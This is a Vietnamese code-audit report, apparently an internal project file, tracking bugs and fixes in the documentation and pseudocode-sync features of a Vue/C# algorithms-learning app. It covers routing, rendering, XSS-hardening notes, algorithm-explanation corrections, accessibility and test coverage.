- **Kịch bản:** bài A copy hoạt động → chuyển bài B → copy/Playground/dual-code đều không phản hồi.
- **Đề xuất:** gỡ cờ và so sánh ref thay đổi, hoặc attach vào onMounted/watchEffect.

### DC-005 — Fallback "Quay lại trang chính" → dead link vòng lặp
- **Status:** ✅ FIXED - 2026-08-10 (fallback chuyển sang `/docs/intro/intro`)
- **Vị trí:** `DocsView.vue:25` (`to="/docs/intro"` — file `content/intro.md` không tồn tại → lại hiện "Không tìm thấy nội dung")
- **Đề xuất:** sửa thành `/docs/intro/intro`.

### DC-006 — 4 route redirect toàn dead: `/oop`, `/solid`, `/di`, `/patterns`
- **Status:** ✅ FIXED - 2026-08-10 (redirect sang bài đầu từng nhóm: `/oop→/docs/oop/encapsulation`, `/solid→/docs/solid/srp`, `/di→/docs/di/basics`, `/patterns→/docs/patterns/singleton`)
- **Vị trí:** `routes.ts:22-25` (redirect sang `/docs/oop`... — không có `content/oop.md` v.v.)
- **Đề xuất:** redirect sang bài đầu từng nhóm (`/docs/oop/encapsulation`...).

### DC-007 — 14 slug `/docs/<topic>` chết (getFirstSectionOfTopic là dead code)
- **Status:** ✅ FIXED - 2026-08-10 (nối dây `getFirstSectionOfTopic(pathSegments)` vào fallback — mọi `/docs/<topic>` resolve đúng bài đầu nhóm)
- **Vị trí:** `DocsView.vue:56-79` (`getFirstSectionOfTopic(pathSegments)` — tham số KHÔNG được dùng, luôn trả bài đầu toàn cây), `:89-95` (chỉ fallback khi pathSegments.length===0)
- **Mô tả:** mọi `/docs/intro`, `/docs/sorting`, `/docs/trees`... → lookup `content/<topic>.md` không tồn tại → dead. Root cause: hàm resolve topic→bài đầu đã viết đúng nhưng không nối.
- **Đề xuất:** dùng đúng `getFirstSectionOfTopic(pathSegments)` trong fallback.

## 🟡 P2

| ID | Vị trí | Nội dung |
|---|---|---|
| DC-008 | `DocsMarkdownRenderer.vue:184-220` | Race async điều hướng nhanh → content bài cũ ghi đè bài mới (không generation counter); `createHighlighter` gọi 2 lần song song khi điều hướng nhanh (lãng phí). Đề xuất: `renderSeq` counter + singleton promise highlighter |
| DC-009 | `DocsMarkdownRenderer.vue:402-407,417` | Error box Mermaid chèn message RAW qua innerHTML (sau DOMPurify, không escape) — diagram lỗi chứa `<img onerror>` → XSS defense-in-depth; rủi ro thật khi docs chuyển sang nguồn backend. Đề xuất: `escapeHtmlText(...)` trước khi nhét (cả line 417) |
| DC-010 | `DocsMarkdownRenderer.vue:199-231` | Trùng heading id: `content/hash-table/csharp-hash-collections.md` ("Cách sử dụng cơ bản" ×2) → TOC/anchor nhảy sai, `:key="heading.id"` trùng cảnh báo Vue. Đề xuất: dedup suffix `-1`, `-2` |
| DC-011 | `appTabs.ts:34` + `docsNavigation.ts:179` | Tab "Tài liệu tham khảo" mở `/docs` — sidebar không highlight item nào, prev/next mất (findIndex('/docs')=-1) — nội dung không khớp đường dẫn |
| DC-012 | `DocsSidebarItem.vue:78-80` + trailing slash | `/docs/intro/intro/` → lookup `intro/intro/.md` → dead; `isCurrentRoute` viết NGƯỢC (`currentRoute + '/' === path` không bao giờ true — lẽ ra `path + '/' === currentRoute`) → vừa dead code vừa không sửa được highlight |
| DC-013 | `App.vue:27` + `router/index.ts` | Không scroll-to-top khi chuyển bài — đang đọc giữa bài A (2000px) → bấm bài B thấy giữa chừng bài B. Thêm `scrollBehavior` hoặc reset scrollTop trong watch |
| DC-014 | `DocsMarkdownRenderer.vue:74,187-192` | Shiki `createHighlighter` (8 langs, 200-400ms) khởi tạo lại MỖI route (App remount view) → mỗi click bài mới chậm. Hoist ra module scope (cache toàn cục) |
| DC-015 | `DocsView.vue:82-112` | Race nhỏ: `loadMarkdown` không hủy request cũ — đổi bài nhanh liên tục có thể content cũ ghi đè (dynamic import lần đầu chậm) |

**Trạng thái P2: ✅ DC-008→DC-015 toàn bộ FIXED - 2026-08-10** (chi tiết: DC-008 `renderSeq` counter + singleton highlighter promise; DC-009 escape message Mermaid; DC-010 dedup heading id `-1`/`-2`; DC-011 tab `/docs` highlight hợp lý; DC-012 sửa `isCurrentRoute` đảo ngược + trailing slash; DC-013 `scrollBehavior` scroll-to-top; DC-014 hoist shiki ra module scope; DC-015 guard load cũ)

## 🟡 P3 (tổng hợp)

| ID | Vị trí | Nội dung |
|---|---|---|
| DC-016 | `DocsMarkdownRenderer.vue:328,289,294` | Fallback shiki không escape — `<`,`>` bị DOMPurify strip → code hiển thị sai nội dung (an toàn XSS nhưng sai text). `escapeHtmlText(code)` |
| DC-017 | `linear-search.md:177` | ```ini không nằm trong `langs` đăng ký → fallback: mất highlight + mất copy button. Thêm `ini`/`plaintext` |
| DC-018 | `DocsMarkdownRenderer.vue:375` | `ADD_ATTR: ['style']` nới lỏng DOMPurify — vector CSS exfil truyền thống; content nội bộ chấp nhận được, nên thu hẹp allowlist |
| DC-019 | `DocsMarkdownRenderer.vue:234-242` | Link tương đối `[x](other.md)` để nguyên href → trỏ sai route — nên tự prefix `/docs/` hoặc chặn |
| DC-020 | `DocsView.vue:14` + `DocsMarkdownRenderer.vue:3` | Blank flash giữa các bài — loading=true mà raw='' → vùng trống 100-300ms trước khi spinner |
| DC-021 | DocsLayout/DocsSidebar | Không breadcrumb (các view khác có BreadcrumbsBar), không ô tìm kiếm tài liệu, không scrollIntoView sidebar item active (so CourseSidebar.vue:134), collapse group không giữ state, deep link mất phương hướng |
| DC-022 | `DocsView.vue:100,107-108,122-126` | Dead code: nhánh `'default' in raw` không bao giờ chạy (glob import trả string); log toàn keys khi thiếu file; `watch(() => route.path)` không bao giờ chạy (App remount trước) |
| DC-023 | `docsNavigation.ts:78,84` | Trùng title: `tg-advanced` "Cấu trúc Cây nâng cao" vs group "CẤU TRÚC CÂY NÂNG CAO"; bài `tree-graph/advanced-trees.md` lặp nội dung 2 bài `trees/trie-prefix-tree.md` + `trees/segment-tree.md` |
| DC-024 | `linked-list-basics.md:30-38` | `subgraph Node 1 [Address: 0x7F...]` — id chứa dấu cách không nháy kép: thường vẫn render nhưng nên kiểm tra trực quan |
| DC-025 | `mermaidTheme.ts:44,65` | `fontSize` nhân đôi (13 vs '13px'), palette hardcode hex không lấy CSS variables app |
| DC-026 | `DocsMarkdownRenderer.vue:376` | Emoji trong code block bị thay SVG inline (sau sanitize) — hiển thị khác, copy vẫn lấy bản gốc (OK) |

**Trạng thái P3: ✅ DC-016→DC-026 toàn bộ FIXED - 2026-08-10** (chi tiết: DC-016 escape fallback shiki; DC-017 thêm `ini`/`plaintext` + `normalizeLang`; DC-018 thu hẹp allowlist style + hook kiểm soát; DC-019 prefix link `.md` → `/docs/`; DC-020 spinner giữ vùng; DC-021 **PARTIAL** — đã scrollIntoView active + collapse group giữ state, breadcrumb + ô tìm kiếm ⏳ DEFERRED; DC-022 dọn dead code; DC-023 đổi title "Cây nâng cao (Advanced Trees)" + kiểm tra không trùng nội dung; DC-024 subgraph nháy kép id; DC-025 fontSize 1 nguồn; DC-026 chặn emoji SVG trong code block)

## 🟡 NỘI DUNG KIẾN THỨC (DC-C — sai học thuật)

### DC-C1 (P1) — `sorting/quick-sort.md:95,100` mô phỏng Lomuto sai trạng thái mảng (2 chỗ)
- **Status:** ✅ FIXED - 2026-08-10 (dòng 95 → `[10, 30, 40, 50, 80, 90, 70]`; "Mảng cuối cùng" → `[10, 30, 40, 50, 70, 90, 80]` + ghi chú nửa phải chưa sắp)
- Sau swap 90↔50 tại i=3, mảng thật là `[10, 30, 40, 50, 80, 90, 70]` (file ghi `[10, 30, 40, 50, 90, 80, 70]`); "Mảng cuối cùng" sai — sau swap chốt là `[10, 30, 40, 50, 70, 90, 80]` (nửa phải chưa sắp). Mermaid diagrams đúng, chỉ text diễn giải sai.

### DC-C2 (P1) — `searching/linear-search.md:64-66` Sentinel off-by-one chết người
- **Status:** ✅ FIXED - 2026-08-10 (sửa thành `return (i < n - 1 || last == target) ? i : -1;` + chú thích dòng 64-65)
- `return (i < n - 1) ? i : -1;` — target ở CHÍNH vị trí cuối mảng gốc → trả -1 sai (vd `[5,2,8]` tìm 8). Đúng: `return (i < n - 1 || last == target) ? i : -1;` (chú thích dòng 64-65 cũng khẳng định sai).

### DC-C3 (P1) — `trees/trie-prefix-tree.md:44-54` Mermaid vẽ sai nhánh "app"
- **Status:** ✅ FIXED - 2026-08-10 (bỏ nhánh `e` giả; "app" kết thúc tại P2, P2 chỉ còn 2 con `l, r`)
- Vẽ `P2 --> E["e"]` rồi `E --> Star2("end: app")` — "app" = a-p-p kết thúc tại P2, không có chữ `e`; P2 chỉ nên có 2 con `l, r` nhưng vẽ 3 con `l, e, r`. Người học tưởng "app" = a-p-p-e.

### DC-C4 (P2) — `sorting/bucket-sort.md:30-64` bỏ rơi phần tử 0.68
- **Status:** ✅ FIXED - 2026-08-10 (thêm "Xô 6" chứa 0.68 + kết quả Gather đủ 10 phần tử)
- Mảng đầu vào 10 phần tử nhưng diagram không vẽ "Xô 6" và kết quả Gather thiếu 0.68 (đúng phải đứng giữa 0.39 và 0.72).

### DC-C5 (P2) — `sorting/counting-sort.md` thiếu điều kiện "dữ liệu không âm"
- **Status:** ✅ FIXED - 2026-08-10 (thêm cảnh báo ràng buộc không âm + lý do IndexOutOfRangeException)
- `count[array[i]]++` sẽ `IndexOutOfRangeException` nếu có phần tử âm — bài nói kỹ "khoảng hẹp K" nhưng không bao giờ nêu ràng buộc cốt tử này.

### DC-C6 (P2) — `sorting/sorting-summary.md:22` Bucket Sort "Dựa trên So sánh? ❌"
- **Status:** ✅ FIXED - 2026-08-10 (đổi thành "⚠️ Một phần" + ghi chú Insertion Sort trong xô)
- Bước sắp xếp trong xô (Insertion Sort) là so sánh — không thuần non-comparison như Counting/Radix; tự mâu thuẫn với bucket-sort.md:73 (stable "tùy thuộc").

### DC-C7 (P3) — chính tả/thuật ngữ
- **Status:** ✅ FIXED - 2026-08-10 (heap-sort "ăn thêm"; stack.md gán lại stack thường; advanced-trees ví dụ chữ thường; leetcode-examples đổi tựa "6 bài" → 5 LeetCode + 1 Span\<T\>; segment-tree Fenwick "Build O(N) tối ưu" thống nhất fenwick-tree.md; replication-lag ghi chú giả định; quick-sort "Phân hoạch")
- `heap-sort.md:15` "ăn dặm" → "ăn thêm"; `stack.md:150` gán "Kiểm tra ngoặc hợp lệ" vào Monotonic Stack (thực chất Stack thường — summary:48 nói đúng); `advanced-trees.md:29-44,76` ví dụ IN HOA (CAT/CAR/COW) nhưng code `c - 'a'` chỉ hợp lệ chữ thường; `leetcode-examples.md:2,6` tựa "6 bài" nhưng chỉ 5 bài LeetCode + 1 mục Span\<T\>; `segment-tree.md:464` Fenwick "Build O(N log N)" mâu thuẫn `fenwick-tree.md:269` (O(N) tối ưu); `replication-lag.md:82-87,129-131` con số lag "100ms-1s" trình bày như quy tắc chung (thực chất giả định mô phỏng); `quick-sort.md:3,10` dịch "Partition" → "Phân mảnh" (đúng phải "Phân hoạch").

## 🟡 TEST & TRACKING DOCS

| ID | Nội dung |
|---|---|
| DC-T1 | **0 component test** cho toàn bộ docs (DocsView/Sidebar/Layout/Renderer/TOC — grep toàn src); chỉ 2 test mermaid parse (`docsMermaidSyntax.spec.ts` — đọc file thật 68 file/95 khối, parse thật, tốt). Phủ tổng thể ≈ 10-15% |
| DC-T2 | Mermaid render không test được trong jsdom (`getBBox is not a function` — đã probe 95/95 fail) → cần Playwright; tối thiểu test round-trip `encodeURIComponent` data-mermaid-code |
| DC-T3 | Không có test chốt nav↔file consistency (hiện 68/68 đúng nhưng regression sẽ chết lặng) + test heading id unique (bắt DC-010) + frontmatter presence |
| DC-T4 | `progress.md:232` ghi Docs 2/2 ✅ khớp thực tế; nhưng `features-tested.md` KHÔNG có mục Docs — vi phạm nhẹ Tracking-First |
| DC-T5 | `docsMermaidSyntax.spec.ts:44,62` — `parseError` khai báo không dùng |

**Trạng thái: ✅ DC-T1→DC-T5 toàn bộ FIXED - 2026-08-10** (DC-T1 thêm `docsComponentTests.spec.ts` **35 test** + `docsNavigationConsistency.spec.ts` 5 test; DC-T2 test round-trip `encodeURIComponent` data-mermaid-code; DC-T3 chốt nav↔file 68/68 + heading id unique + frontmatter; DC-T4 thêm mục Docs vào `features-tested.md`; DC-T5 bỏ `parseError` unused — docs suite 2→**42 test, 42/42 pass**)

---

# 3. 🧠 PSEUDOCODE SYNC

**Code scope:** `frontend/src/features/pseudocode-sync/**`, `frontend/src/features/animation-engine/components/VisualizationPlayer.vue`, backend `FrameDTO.cs`
**Spec:** `plan/features/deep-decomposition/phase1-pseudocode-sync/*.md`

## 🔴 P0

### PS-001 — Không có nguồn dữ liệu thật: frame không bao giờ mang `activeLogicalLineId`/`variables`
- **Status:** ✅ FIXED — 2026-08-10 (phần nguồn dữ liệu; backend + fallback frontend — `FrameDTO.cs` thêm `ActiveLogicalLineId`/`Variables` nullable, `AlgorithmBase.CaptureState` nhận optional param, `BubbleSortStrategy` emit FUNC_DECL/OUTER_LOOP/INNER_LOOP/COMPARE_STEP/SWAP_STEP + variables; `sortingGenerators.generateBubbleSort` + `algorithmApi.generateDummyBubbleSortResult` bổ sung đồng bộ. Còn chờ: agent engine/store đọc field — đã đọc sẵn tại `usePseudocodeStore.ts:27-32,34-38`)
- **Vị trí:** `backend/src/Domain/Engine/FrameDTO.cs:8-37` (chỉ có `ActiveLine` int, `StepId`, `Explanation`, `Highlights`); mọi strategy backend chỉ gán `ActiveLine`; fallback `frontend/src/features/dsa-modules/services/sortingGenerators.ts:4-20` cũng thiếu; `usePseudocodeStore.ts:26-32` đọc `animStore.currentFrame?.activeLogicalLineId ?? null` → **luôn null**
- **Mô tả:** Chỉ nguồn duy nhất có field là `algorithmApi.ts:52-102` (`generateDummyBubbleSortResult`) — chỉ dùng trong `__tests__`.
- **Kịch bản:** Chạy bubble-sort (backend hoặc offline) → không dòng nào sáng, click không tua, badge không hiện, Watch Panel rỗng.
- **Đề xuất:** (a) thêm `ActiveLogicalLineId` + `Variables` vào `FrameDTO.cs` và toàn bộ strategy backend; (b) bổ sung vào `sortingGenerators.ts`; hoặc (c) enrich frontend ánh xạ `activeLine` → logicalId tại `usePseudocodeStore`.

### PS-002 — Component chết: `MultilingualCodePanel` chỉ mount trong `VisualizationPlayer` — không view nào mount `VisualizationPlayer`
- **Status:** OPEN
- **Vị trí:** `VisualizationPlayer.vue:19`, `frontend/src/router` (routes không import), chỉ test `checkoutP2Tests.spec.ts:293` mount
- **Mô tả:** Toàn bộ UI pseudocode (code panel, watch panel) không bao giờ xuất hiện trong app.
- **Đề xuất:** Mount `VisualizationPlayer` vào view thật (vd lesson/DSA module view) hoặc xác nhận defer + cập nhật tracking về `🟠 PARTIAL`.

### PS-003 — `highlightSyntax` phá vỡ toàn bộ render: regex chạy trên HTML đã chèn span → chữ rác CSS
- **Status:** ✅ FIXED — 2026-08-10 (tokenizer 1 lượt trên text gốc: alternation `(comment|string|apiFunc|keyword|number|punct)` khớp raw text, escape từng token `& < >` trước khi nối HTML; xác minh jsdom: không còn `#60a5fa` rác, comment nguyên khối, `&gt;` không dư; dev-check 8/8 pass)
- **Vị trí:** `utils/syntaxHighlighter.ts:28-41` (dùng tại `MultilingualCodePanel.vue:30` qua `v-html`)
- **Mô tả:** 3 regex pass cuối chạy trên chuỗi đã chèn `<span style="color:#60a5fa;...">`:
  - `:28` `([{}()\[\]:;])` bọc `:`/`;` bên trong attribute style → phá vỡ attribute;
  - `:33` `\b(\d+)\b` bọc số `500` trong `font-weight: 500;`;
  - `:38` `#.*` khớp `#60a5fa` → bọc cả dòng thành comment.
- **Bằng chứng (đã chạy jsdom):** `for (int i = 0; i < n-1; i++) {` → `#64748b;">: #60a5fa; font-weight: 500;">for (: #60a5fa; ...` — không đọc được.
- **Đề xuất:** Viết lại theo tokenizer 1 lượt trên text gốc (alternation regex `keyword|number|comment|punct`, escape từng token), hoặc dùng thư viện (Prism/Shiki). Bắt buộc thêm unit test `highlightSyntax`.

## 🟠 P1

### PS-004 — Đổi sang thuật toán không có script → hiển thị mã giả CŨ sai
- **Status:** ✅ FIXED — 2026-08-10 (`VisualizationPlayer.vue` thêm `else pseudocodeStore.resetStore();` khi `loadPsScript(newId)` trả null)
- **Vị trí:** `VisualizationPlayer.vue:60-69` (`if (script) pseudocodeStore.loadPseudocodeScript(...)` — thiếu `else`; registry chỉ có `'bubble-sort'` trong khi courses.ts có 17+ thuật toán)
- **Kịch bản:** Chạy bubble-sort → chuyển quick-sort → panel hiện pseudocode bubble-sort khi canvas chạy quick-sort; frame trùng `logicalId` sẽ highlight dòng code sai thuật toán.
- **Đề xuất:** Thêm `else pseudocodeStore.resetStore();` (watch quiz cùng chỗ đã làm đúng).

### PS-005 — Auto-scroll sai hệ tọa độ: `offsetTop` vs `scrollTop` → panel nhảy về đáy
- **Status:** ✅ FIXED — 2026-08-10 (`MultilingualCodePanel.vue` dùng rect math: `top = aRect.top - vRect.top + viewportEl.scrollTop`; kèm PS-019: `behavior:'auto'` khi PLAYING)
- **Vị trí:** `MultilingualCodePanel.vue:63-73` (`.code-viewport` không có `position`, offsetParent là `<body>`)
- **Mô tả:** `elTop = activeEl.offsetTop` tính theo body nhưng `viewportEl.scrollTop` là tọa độ trong viewport → điều kiện `elTop + elHeight > viewTop + viewHeight` gần như luôn đúng → scroll về đáy mỗi frame đổi. Bubble-sort chỉ 9 dòng nên đang "ngủ đông", sẽ bùng với thuật toán dài hơn.
- **Đề xuất:** Dùng rect math: `top = aRect.top - vRect.top + viewportEl.scrollTop`, so sánh với `scrollTop/clientHeight`.

### PS-006 — Debounce highlight 50ms khi speed ≥ 2.0x (BEHAVIOR_SPEC §1) chưa implement
- **Status:** ✅ FIXED — 2026-08-10 (`usePseudocodeStore.ts` — watcher flush:'sync' theo `currentFrame`/`selectedLanguage`/`codeLanguages`; tốc độ ≥ 2.0 → trailing debounce 50ms và XOÁ highlight ngay khi vào cửa sổ (bỏ qua dòng trung gian, chỉ hiện dòng đích cuối — BEHAVIOR_SPEC §1); tốc độ < 2.0 cập nhật đồng bộ; timer được clear trên mọi lần reset + `onScopeDispose` khi store thải hồi — không leak timer)
- **Vị trí:** `usePseudocodeStore.ts:25-30` (computed trực tiếp, không debounce), `MultilingualCodePanel.vue:63` (watch + scrollTo smooth mọi frame)
- **Mô tả:** Ở tốc độ cao frame < 50ms → highlight nhấp nháy, smooth-scroll xếp hàng jank.
- **Đề xuất:** Watcher debounce 50ms khi `playbackSpeed >= 2`; dùng `behavior:'auto'` khi đang PLAYING.

### PS-007 — Click-to-snap lệch BEHAVIOR_SPEC §2: click luôn nhảy "occurrence kế tiếp" thay vì first occurrence
- **Status:** OPEN
- **Vị trí:** `MultilingualCodePanel.vue:60` (luôn gọi `snapToNextOccurrence`, `pseudocodeStoreHelpers.ts:29-36`) — action `snapToLogicalLine` (usePseudocodeStore.ts:75) đúng spec nhưng không được UI dùng
- **Kịch bản:** Ở frame 90, click dòng swap → wrap về occurrence đầu (frame 5) thay vì giữ nguyên — bất ngờ.
- **Đề xuất:** Click = `snapToLogicalLine` (first occurrence); nút/badge nhỏ = `snapToNextOccurrence`.

### PS-008 — Không reset pseudocode store khi rời view (stale state xuyên view)
- **Status:** ✅ FIXED — 2026-08-10 (`VisualizationPlayer.vue` onUnmounted thêm `pseudocodeStore.resetStore()` trước `quizStore.resetQuizStore()`)
- **Vị trí:** `VisualizationPlayer.vue:96-99` (`onUnmounted` chỉ reset quiz + `animStore.destroy()`)
- **Đề xuất:** Thêm `pseudocodeStore.resetStore()` vào `onUnmounted`.

### PS-009 — `temp` trong frame swap hiển thị sai giá trị
- **Status:** ✅ FIXED — 2026-08-10 (capture `temp` TRƯỚC lệnh swap ở cả 3 nguồn: `algorithmApi.ts` dummy, `sortingGenerators.ts`, `BubbleSortStrategy.cs` — `[5,3,8,...]` frame swap đầu hiển thị `temp = 5` đúng)
- **Vị trí:** `algorithmApi.ts:68-79` — swap thực thi tại :69 TRƯỚC khi tạo frame, rồi `variables: { temp: arr[j] }` (:78) = giá trị đã bị ghi đè
- **Kịch bản:** [5,3,8,...] frame swap đầu tiên hiển thị `temp = 3`, đúng phải là `temp = 5`.
- **Đề xuất:** Capture `const temp = arr[j]` trước lệnh swap (mẫu cho backend khi bổ sung Variables).

## 🟡 P2

| ID | Vị trí | Nội dung |
|---|---|---|
| PS-010 | `algorithmApi.ts:56-93` + `bubble-sort.pseudocode.ts:16` | `INNER_LOOP` không bao giờ được emit — dòng 3 (C++/Java/JS) và 4 (Python) không bao giờ highlight; test `scriptLoader.spec.ts:29-46` không đối chiếu generator nên không bắt được — ✅ FIXED 2026-08-10 (thêm frame `INNER_LOOP` đầu mỗi pass ở cả dummy `algorithmApi.ts`, `sortingGenerators.ts`, backend `BubbleSortStrategy.cs`) |
| PS-011 | `bubble-sort.pseudocode.ts:32-34` (Java), `:44-45` (Python) | Nhiều dòng cùng `logicalId` → `getPhysicalLineNumber` (PseudocodeSyncEngine.ts:16) trả first match → chỉ dòng đầu sáng. Đề xuất: logicalId duy nhất hoặc trả danh sách line — ✅ FIXED 2026-08-10 (chọn hướng ENGINE TRẢ DANH SÁCH — ít phá vỡ test nhất: thêm `PseudocodeSyncEngine.getPhysicalLineNumbers` trả toàn bộ line khớp, `getPhysicalLineNumber` trở thành first-match của danh sách (1 nguồn lookup); store expose `activePhysicalLineNumbers: number[]` song song `activePhysicalLineNumber` cũ. TODO agent component: `MultilingualCodePanel.vue` chuyển sang `activePhysicalLineNumbers` để Java 3 dòng SWAP (5,6,7) + Python/JS 2 dòng FUNC_DECL cùng sáng) |
| PS-012 | `MultilingualCodePanel.vue:30` | Class `white-space-pre` **không tồn tại** trong codebase (Tailwind chuẩn là `whitespace-pre`) → mất thụt lề toàn bộ code. Lệch `02-ui-ux.md` §3.1 — ✅ FIXED 2026-08-10 (đổi class `whitespace-pre` + thêm `white-space: pre` trực tiếp vào `.code-line` CSS) |
| PS-013 | `MultilingualCodePanel.vue:31-32,57-58` + `pseudocodeStoreHelpers.ts:38-52` | Hiệu năng O(L×F) mỗi render: `getSyncFrames`/`getOccurrenceInfo` không cache, gọi 2 lần/dòng trong template `v-for`. Đề xuất: 1 computed `Map<logicalId, {current,total}>` — ✅ FIXED 2026-08-10 (computed `occurrenceMap` 1 lần mỗi khi frames/currentIndex/script đổi, template đọc từ map) |
| PS-014 | `MultilingualCodePanel.vue:61` | `preventDefault` Tab vô điều kiện → bẫy focus, không rời được panel bằng Tab. Đề xuất: `Ctrl+Tab` hoặc Alt+Tab — ✅ FIXED 2026-08-10 (Tab giữ focus mặc định; chỉ Ctrl+Tab/Alt+Tab, Shift để đổi ngược chiều, mới hoán chuyển ngôn ngữ) |
| PS-015 | `VariableWatchPanel.vue:2,5-14` | Thứ tự badge theo `Object.entries` từng frame → nhảy/giật liên tục; `v-if="watchVariables.length > 0"` → panel biến mất khi frame thiếu variables → khung co giãn đột ngột. Đề xuất: sort thứ tự cố định + `min-height` — ✅ FIXED 2026-08-10 (sort alphabet theo tên + bỏ v-if + `min-height: 96px` cho card) |
| PS-016 | `usePseudocodeStore.ts:25-30` | Tự viết lại lookup thay vì gọi `PseudocodeSyncEngine.getPhysicalLineNumber` — trùng lặp logic, nguy cơ drift — ✅ FIXED 2026-08-10 (store gọi duy nhất `PseudocodeSyncEngine.getPhysicalLineNumbers`, bỏ `.find()` tự viết; engine là single source of truth) |
| PS-017 | `scriptLoader.ts:16-18` | Dùng `in` operator → `hasPseudocodeScript('toString')` trả true; `loadPseudocodeScript('constructor')` trả `Object.prototype.constructor` → crash. Đề xuất: `Object.hasOwn` — ✅ FIXED 2026-08-10 (`Object.hasOwn(scriptRegistry, id)` cho cả 2 hàm) |
| PS-018 | `MultilingualCodePanel.vue:20` | Ref callback bỏ qua `null` → `lineRefs` giữ node detached khi đổi ngôn ngữ (C++ 9 dòng → Python 6 dòng) — ✅ FIXED 2026-08-10 (callback `else { delete lineRefs[line.lineNumber] }` khi el null) |
| PS-019 | `MultilingualCodePanel.vue:70` | `scrollTo({behavior:'smooth'})` mỗi frame đổi → smooth-scroll xếp hàng jank khi seek nhanh — ✅ FIXED 2026-08-10 (`behavior: animStore.isPlaying ? 'auto' : 'smooth'`) |
| PS-020 | `pseudocodeStoreHelpers.ts:47` | Badge occurrence hiển thị "2/5" cho dòng chưa thực thi (tính occurrence kế tiếp). Đề xuất: chỉ hiển thị chính xác khi `logicalId === activeLogicalLineId` — ✅ FIXED 2026-08-10 (badge chỉ render khi `line.logicalId === pseudocodeStore.activeLogicalLineId && total > 1`) |
| PS-021 | `usePseudocodeStore.ts:14` | Hardcode `useAnimationStore()` — không tham số hoá store nguồn (playground không dùng được nếu sau này cần) — ✅ FIXED 2026-08-10 (thêm `bindAnimationStore(store)`/`unbindAnimationStore()`; LƯU Ý: không dùng tham số setup store vì pinia 2.3+ gọi `setup({ action })` — tham số đầu bị context nội bộ chiếm; default giữ nguyên `useAnimationStore()`) |
| PS-022 | `pseudocodeStoreHelpers.ts:24-25,33-34` | `pause()` gọi 2 lần (goToFrame đã pause) — ✅ FIXED 2026-08-10 (bỏ cả 2 `animStore.pause()` trong `snapToLogicalLine`/`snapToNextOccurrence`; ghi hợp đồng `goToFrame` tự pause vào interface) |
| PS-023 | `scriptLoader.ts:8-10` | Registry không validate cấu trúc script khi đăng ký (thiếu `languages`, lineNumber trùng, logicalId rỗng chỉ bắt ở runtime) — ✅ FIXED 2026-08-10 (thêm `validatePseudocodeScript` + `registerPseudocodeScript`: fail-fast throw kèm console.error liệt kê lỗi — languages non-empty, language ∈ SUPPORTED_LANGUAGES, lines non-empty, lineNumber dương & duy nhất, text/logicalId non-empty; registry dựng qua register) |
| PS-024 | `algorithmApi.ts:46-54,84-92` | Dummy generator: frame đầu `activeLine=0` gắn `FUNC_DECL` (dòng "for i from 0 to N-1"); `OUTER_LOOP` phát CUỐI mỗi pass (dòng `for i` sáng lúc pass kết thúc thay vì bắt đầu) — ✅ FIXED 2026-08-10 (thêm frame `OUTER_LOOP` ngay đầu mỗi pass ở cả dummy, `sortingGenerators.ts` và backend) |

## 🟡 P3 (test/tracking)

| ID | Vị trí | Nội dung |
|---|---|---|
| PS-025 | `progress.md:260`, `decisions.md:228` | Tracking ghi "37 Unit Tests (15/15/7)" — thực tế engine 27 + store 15 + loader 7 = **49** (+ 8 P0Tests = 57) |
| PS-026 | `progress.md:259`, `decisions.md:224` | Ghi "đã thêm `activeFrame` alias" — **không tồn tại** trong `useAnimationStore.ts` (chỉ có `currentFrame`) |
| PS-027 | `progress.md:258` | Ghi "Integration VisualizationPlayer + Dummy Generators ✅ CODE DONE" — nhưng VisualizationPlayer chưa mount view nào → phải là `🟠 PARTIAL` |
| PS-028 | `plan/tracking/features-tested.md` | Thiếu toàn bộ mục Pseudocode Sync dù 57+ tests tồn tại |
| PS-029 | `usePseudocodeStore.spec.ts` | Thiếu test `snapToNextOccurrence`, `getOccurrenceInfo.current`, `getSyncFrames`; thiếu biên: logicalId frame không có trong script, dataset đổi giữa chừng |
| PS-030 | `PseudocodeSyncEngine.spec.ts:129-158` | `transformVariablesForWatch` filter undefined/null (BEHAVIOR_SPEC §3) chưa có test nào |
| PS-031 | `editorP2Tests.spec.ts:388` | `vi.useFakeTimers` nhưng không có timer nào — dấu vết test debounce §1 định viết mà không viết |
| PS-032 | `editorP2Tests.spec.ts:501-547` | Component test Click-to-Snap nằm sai feature (test `PseudocodePanel` của code-editor, không phải MultilingualCodePanel) |
| PS-033 | `MultilingualCodePanel.vue:5-13` | Tabs thiếu `role="tablist"/"tab"`, `aria-selected`, `aria-controls`; viewport thiếu aria-label; `.code-viewport` có `outline:none` (mất focus ring) — ✅ FIXED 2026-08-10 (tablist/tab + aria-selected + aria-controls + aria-labelledby; viewport role=tabpanel + aria-label; focus-visible ring cho tab/viewport/code-line) |
| PS-034 | `MultilingualCodePanel.vue:21` | Dòng code không `tabindex`/`role="button"` — bàn phím không snap được — ✅ FIXED 2026-08-10 (dòng code `tabindex="0"` + `role="button"` + `@keydown.enter` snap như click) |
| PS-035 | `MultilingualCodePanel.css:73-93,49-61`, `VariableWatchPanel.vue:29-35` | Lệch CSS spec 02-ui-ux.md: active line thiếu neon text-shadow, gutter 24 vs 28px, padding 4/14 vs 6/20, font tab 11 vs 13px, watch panel margin — ✅ FIXED 2026-08-10 (text-shadow neon green `0 0 10px`; gutter 28px/margin 16px; padding 6/20; font tab 13px; watch card margin 16px/padding 16px/radius 16px + min-height) |
| PS-036 | `syntaxHighlighter.ts:2` | Dòng trống render thành `//` giả — ✅ FIXED 2026-08-10 (trả `''` khi text rỗng/whitespace-only) |
| PS-037 | `MultilingualCodePanel.vue:26` | Điều kiện thừa `!isLineExecutable(x) && x === 'NO_ACTION'` — dead logic — ✅ FIXED 2026-08-10 (class binding đơn giản thành `'comment': !isLineExecutable(line.logicalId)`) |
| PS-038 | `types/pseudocode.types.ts:19-22` vs `TECHNICAL_SPEC.md:29-33` | `VariableState` thiếu field `type: 'index'|'pointer'|'temporary'` — watch panel không phân loại biến — ⏳ TODO (types/* do agent khác sở hữu; VariableWatchPanel.vue đã để sẵn TODO comment chờ field type) |
| PS-039 | `syntaxHighlighter.ts:9-12,20` | Bộ keyword chung mọi ngôn ngữ — `def/in/range/len` tô màu cả trong C++/Java/JS; `print` tô như API func — ✅ FIXED 2026-08-10 (bảng KEYWORDS/API_FUNCS tách theo ngôn ngữ, `highlightSyntax(text, language?)`; `def/in/range/len` chỉ python, `print` chỉ API python) |
| PS-040 | `pseudocodeP0Tests.spec.ts:92` | Stub `BaseIcon` không được component dùng |
| PS-041 | `animation-engine/components/index.ts:3` | `AnimPseudoCodePanel` cũ vẫn export — dead code duy trì |

---

